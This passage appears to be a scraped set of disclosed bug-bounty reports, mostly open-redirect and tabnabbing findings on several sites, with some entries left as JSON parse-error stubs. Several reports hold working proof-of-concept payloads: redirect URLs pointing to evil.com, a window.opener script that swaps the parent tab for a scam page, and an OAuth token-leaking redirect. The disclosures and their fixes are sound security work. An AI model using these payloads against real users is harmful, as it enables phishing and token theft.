+The following Proof of Concept URL enables a malicious actor to execute this redirect against any user – as long as they have permissions to view a certain repository. 
+
+```
+http://<instance>/<user>/<repository>/import?continue[to]=//google.com
+```
+
+## Observation
+I first noticed the `continue[to]` parameter while receiving the `You're not allowed to make changes to this project directly` message – demonstrating that edit-level access to the repository in question is not required.
+
+Thanks!
+
+
+===== RDIR-216806 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-217430 | [connect.teavana.com] Open Redirect and abuse of connect.teavana.com | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=764
+This report highlights an open redirect and abuse on a subdomain of teavana.com. The attacker could create an account with a third party company and use that to create a fake campaign. The attacker could then promote the link using a subdomain of teavana.com/<fake_campaign_name> and send the subdomain of teavana.com/<fake_campaign_name> to the victim. When the victim opens up that subdomain with the fake campaign name attached, the victim is redirected to the fake campaign page and at this point the victim could be susceptible to malicious attacks like identity theft or malware being downloaded onto their system. Such a vulnerability could be remediated by whitelisting certain domains to avoid arbitrary usage of subdomains of teavana.com.
+[team summary] 
+
+
+===== RDIR-218705 | Example HackerOne security@ forward domain is not registered | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=1359
+### Description
+
+In [this how-to article](https://support.hackerone.com/hc/en-us/articles/218142843-How-to-forward-emails-to-the-HackerOne-inbox), `@security-h1-forward.com` appears as a valid HackerOne domain for forwarding security issues. This domain is not registered. The actual flow does **not** include this domain, but I think it's confusing enough to consider the risk of someone mistakenly using the domain listed in the article (for example people that do not understand the *exempli gratia* abbreviation) 
+
+{F173415}
+
+I am not entirely sure whether this would qualify as a security issue but I do think it is something you should consider fixing. The risk is low, but the impact is high (both the exposure of incoming security reports without them being forwarded to the actual vendor and a false credibility for the domain), and a fix would be rather easy to implement. 
+
+### Steps To Reproduce
+
+1. Register `security-h1-forward.com` for **[$1](https://www.godaddy.com)**
+2. Set up catch all e-mail forwarding to your e-mail address
+3. Wait for security reports to come in that are mistakenly send to the domain mentioned in the help article
+
+I'm aware of the fact that `support.hackerone.com` is excluded from the scope, but since it's not a vulnerability is the actual software itself, I thought it'd be OK to report it.
+
+Best regards,
+
+
+Inti
+
+
+
+
+===== RDIR-219215 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-219458 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-219599 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-220737 | Tabnabbing via Window.Opener @Mavenlink | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=2246
+Details:
+When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.
+
+POC: 
+Edit your website in work sample, with the website URL of http://daniel-tomescu.com/hackerone/landpage.php, which has the following code.
+
+<html>
+<script>
+window.opener.location.replace('http://daniel-tomescu.com/hackerone/scampage.php');
+</script>
+
+My cool page with some funny cat pictures.<br> <br>
+
+<img style="height:400px; width:300px;" src="http://static.tumblr.com/81b6d42b4064def5e9062d5f4410c820/betml74/Yl5ml0lia/tumblr_static_impress.jpg">
+</html>
+
+Create a work sample, and add that website, but make sure to publicize your profile, in order for other users to see,  you can then click on the link to the website. This opens in a new tab, and the existing tab is silently redirected to the a website without asking the user. In a real life example, this would redirect to a phishing site to try gain credentials for users.
+
+The javascript code that does all the magic: 
+window.opener.location.replace(newURL);
+
+Ways to solve this:
+
+Don't open links in new tabs using the target="_blank"
+Add attribute rel="noreferrer" which also disables referrer
+Set the window.opener attribute to null on the new tab before redirecting, like this: <script>var w=window.open(url, "target=_blank");w.opener=null;</script>
+I hope you see why this is dangerous: this method has huge potential for tricking users that click on external links from this site to be a victim of a scam page because the redirecting is made in the background, while the user is focused on another tab.
+
+More then that, some browsers like Mozilla for Android don't even display the URL, just the page title, so the user has no way of knowing that he was redirected to a scam page.
+
+Note that the target page doesn't have to be in the same-origin policy, so can be an entirely different domain, and the redirect happens silently while user is viewing another page.
+
+Hope that all helps, let me know if you need more information. I can provide screenshots and/or screencasts if necessary.
+
+Wonder if this is eligible for a bounty? :)
+Hope you'll triaged this.
+
+Kind Regards,
+Jolan Saluria
+
+
+===== RDIR-223326 | Open Redirect via "next" parameter in third-party authentication | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=534
+Hi,
+
+It is currently possible to execute an open redirection attack via the `next` parameter with the inclusion of a triple-slash prefix.
+
+## Proof of Concept
+### Redirect URL
+```
+https://demo.weblate.org/accounts/login/github/?next=///google.com
+```
+
+After authenticating, the user will be immediately redirected to the attacker-specified target.  I believe this affects all third-party authentication providers on the Weblate platform.
+
+Please let me know if you require any additional details regarding this vulnerability.
+
+Thanks!
+
+
+===== RDIR-223718 | Open redirect in Signing in via Social Sites | sev=medium | bounty=None | substate=duplicate | weak=Open Redirect | len=664
+Weak **Authentication** Leads to the **Open redirection** to **_Malicios Sites_** :
+
+### Signing in via Facebook :
++ https://hosted.weblate.org/accounts/login/facebook/?next=///evil.com
+
+### Signing in via Gmail :
++ https://hosted.weblate.org/accounts/login/google-oauth2/?next=///evil.com
+
+### Signing in via Github:
+
++ https://hosted.weblate.org/accounts/login/github/?next=///evil.com
+
+### Signing in via Bitbucket:
+
++ https://hosted.weblate.org/accounts/login/bitbucket/?next=///evil.com
+
+### Signing in via Gitlab:
+
++ https://hosted.weblate.org/accounts/login/gitlab/?next=///evil.com
+
+### Vulnarable Parameter: 
+
+**" next  "**
+
+Greets
+**Raja Uzair Abdullah**
+
+
+===== RDIR-224317 | Open redirect while disconnecting authenticated account | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=516
+Hi team, 
+there is a open redirect end point when any account owner disconnect authenticated accounts say
+google. He is redirected to some other domain.
+
+Vulnerable URL
+---
+[demo.weblate.org/accounts/disconnect/google-oauth2/2335/?next=](demo.weblate.org/accounts/disconnect/google-oauth2/2335/?next=)
+
+POC 
+1. Go to authentication tab.
+2. Disconnect Google account and capture the request.
+3. Now, after next= write https://evil.com.
+4. You are redirected to evil.com
+
+video POC is attached.
+
+Best Regards
+Gurwinder
+
+
+===== RDIR-226408 | Open Redirect in shopify app URL | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=534
+Hi,
+
+The Amazon Alexa app when installing calls a URL https://assistant-client.meteorapp.com/shopify/callback?code=6aae881ab9c4f12d5b264e6c871a108a&hmac=6109806a12b0439d6a2dce2d547344eb1c2c53e9691259f39eefbb93b9c9c97b&shop=pappuza-2.myshopify.com&timestamp=1494008598
+
+The **shop** parameter will accept any domain and redirects. 
+Don't know whether meteorapp.com is controlled by you but reporting this as this found as made by shopify in the app store.
+
+If not going to resolve this, please do not mark as NA. I will do the needful.
+
+
+===== RDIR-231760 | Open redirect on sign in  | sev=low | bounty=None | substate=not-applicable | weak=Open Redirect | len=96
+Sir I make a video for clear understand. Watch that video. 
+Thanks 
+Best Regards
+Anirban Singha
+
+
+
+===== RDIR-236599 | Open redirects protection bypass | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=2001
+Hello,
+
+When a redirect is to be issue on an ExpressionEngine instance, a request to the following URL is made:
+`http://HOST/PATH_TO_EE/index.php?URL=TARGET_URL`
+Where `TARGET_URL` is replaced with the actual URL we desire to redirect to. The script `PATH_TO_EE_DIR/system/ee/legacy/libraries/Redirect.php` is the one responsible for making sure that redirects are authorized by checking the value of the Referer header against the hostname where the ExpressionEngine instance is installed. In order to do so, the following code excerpt is performed:
+
+`if ($force_redirect == TRUE OR ( ! isset($_SERVER['HTTP_REFERER']) OR ! stristr($_SERVER['HTTP_REFERER'], $host)))`
+
+Ignoring the very first condition because it is not relevant, and the second because it simply checks if the Referer header is not set in the request, the third condition is the actual problem here. The PHP `stristr` function is used to compare the value of the $host variable, which contains the hostname, to the value of the Referer header. The mentioned function returns TRUE iff the second parameter has been found at least once in the first string parameter, so for example if the actual hostname of the ExpressionEngine instance is http://www.example.com and the Referer header's value is http://evil.com?http://www.example.com, comparing the former and the latter would yield a TRUE return value from the `stristr` function, leaving the check flawed.
+
+I have prepared a live example that shows the issue in action, follow the steps below to reproduce:
+1- Visit http://strukt.tk/pocs/eeredirect.html
+2- Enter your hostname with the `URL` GET parameter set to whatever external page you desire, the supplied URL should look like `http://HOST/PATH_TO_EE/index.php?URL=https://www.example.com`
+3- Click the `Test !!` button and then click the link that will appear below the input box
+4- Notice that you have been redirected directly to the supplied value of the `URL` GET parameter rather than being prompted as usual
+
+Regards,
+
+
+===== RDIR-238117 | Open redirect while disconnecting Email | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=399
+Hi team, 
+there is a open redirect end point when any account owner disconnect email accounts. He is redirected to some other domain.
+
+Vulnerable URL
+
+https://demo.weblate.org/accounts/disconnect/email/2354/?next=http://google.com
+POC
+
+Steps:
+Go to authentication tab.
+Disconnect Email account and capture the request.
+Now, after next= write https://evil.com.
+You are redirected to evil.com
+
+Thanks,
+
+
+===== RDIR-239503 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-242314 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-243062 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-244721 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-244958 | No redirect uri for Twitter Oath resulting in token leak | sev=low | bounty=None | substate=resolved | weak=Improper Authentication - Generic | len=799
+Good afternoon,
+
+There's an opportunity to steal Oath tokens upon the return uri in the following redirect.
+
+https://wakatime.com/oauth/twitter/authorize?reason=tweet&next=/share/embeddable/5e22456d-9aae-4267-b1a9-4315c2605d89/0ed2e4de-f479-4e03-a8db-464a0696c08f.svg/tweet
+
+If I change the &next= to my profile for example /@5e22456d-9aae-4267-b1a9-4315c2605d89
+
+This results in an open redirect to my main profile leaking the Oauth token: 
+
+#POC
+
+https://wakatime.com/oauth/twitter/authorize?reason=tweet&next=/@5e22456d-9aae-4267-b1a9-4315c2605d89
+
+results in F199105
+
+Here's a video demonstrating the vulnerability. F199111
+
+#Patch
+Add a redirect uri that can't be tampered with.
+
+#References
+
+This is almost the exact same scenario that is in this report.
+https://hackerone.com/reports/140432
+
+
+
+
+===== RDIR-246897 | Open Redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1123
+Hello,
+
+i found Open Redirect 
+
+#POC : 
+- go to 
+https://t.lv.twimg.com/live_video_stream/authorized_status/883213898672783361/LIVE_PUBLIC/DEHOXIMUQAEbRFW?url=https://google.com/&ctx=27_883213898672783361:AAAAEIDslSPDE_gV-wU3Opzr9YAPswhkTvPilFsbz0m-QHi4zZGjkDktKKAldYW9vrXUzlTimnrcBaI0_UMq0VTZFEGi2y28FMWT_64G3uUalicaPAIdaxPuqr-K_5kADwxgi-2kQyrU1R4eh-u73RIpcIAcppkOk6JXBfkoRYNYfUpNiAC6wHtW9j97pYVZtSm-ZTOvx_IWbh26eiHUASipHu8CMTvWPby1Apb8tFpu9L9kIs2KTqNutqTk2cnFeSFVbpS1sCqHsAWCtprwiatM-dFger3FzGLnRTcrxgrbcvOhHUqryeUMq1trAekNsazL8lThiV1ig6f49SUizYIg9sEZq4Wqh5qAi4q1d9nOL8cCRBMVd-qgkvCxl41gjpDO70gHiBnNsreuN5MzcrKZxT7fY0cf0EMrVekTJPELycfBKq0HiwJubeo8tBebB_fFt-cqmFB7PflKdgA22yu4mN_NrvG7vCA5OzAYZIIA5vK7-fdmgkn34abSFKj680-zhHqx2IVLK4zmdeq4SRBSxWbFn-iC5x7HNhogriP3coQc4N1_31d6XOOtexkktpSGVsWZ-Y63xbpN&evt=38617099&exp=1499428143990&checksum=nwUP-VQZpwIBcWj-&noredirect=false
+
+- by converting  ``` &noredirect= ```  from   ``` true ```   to  ``` false ```   i was able to redirect users to any site 
+- by clicking on this link you will get redirect to https://google.com  as you can see it on  ``` ?url= ```
+
+{F201033}
+
+Thanks 
+
+
+===== RDIR-252894 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-258632 | owncloud.com open redirect | sev= | bounty=None | substate=informative | weak=Open Redirect | len=45
+Open redirect on owncloud.com
+[team summary] 
+
+
+===== RDIR-259151 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-260278 | TabNabbing issue (due to taget=_blank) | sev= | bounty=None | substate=resolved | weak= | len=823
+Hi team,
+
+i get to know in this particular url 
+https://app.legalrobot-uat.com/dmca-safe-harbor  and i found one 3rd party url.
+
+Issue lies Here :
+```
+<a href="https://eff.org" target="_blank">Electronic Frontier Foundation</a>
+```
+Here i can see you are using target=_blank and  no more rel tag.
+Here , target=_blank means it will open in another new tab. but due to tabnabbing it can change parent tab as well (Legalrobot).
+so as per security principal , don't trust much on 3rd party. and be at your safe sight,
+
+i can recommend you to add rel="noreferer, ,noopener" to avoid this issue.
+
+So final tag for that particular anchor tag will be:
+``
+<a href="https://eff.org" target="_blank" rel="norefere,noopener">Electronic Frontier Foundation</a>
+```
+
+more safe !!
+Please let me know for more information.
+
+Thanks,
+Vishal
+
